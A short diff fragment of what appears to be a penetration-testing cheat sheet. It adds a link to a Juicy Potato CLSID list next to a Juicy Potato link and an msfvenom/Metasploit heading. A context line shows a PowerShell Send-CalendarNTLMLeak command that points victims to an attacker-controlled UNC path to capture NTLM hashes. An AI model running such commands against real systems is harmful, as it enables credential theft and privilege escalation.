@@ -616,6 +616,8 @@ PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<F
 
 > https://github.com/ohpe/juicy-potato
 
+> http://ohpe.it/juicy-potato/CLSID
+
 ### msfvenom and Metasploit Execution
 
 ```c
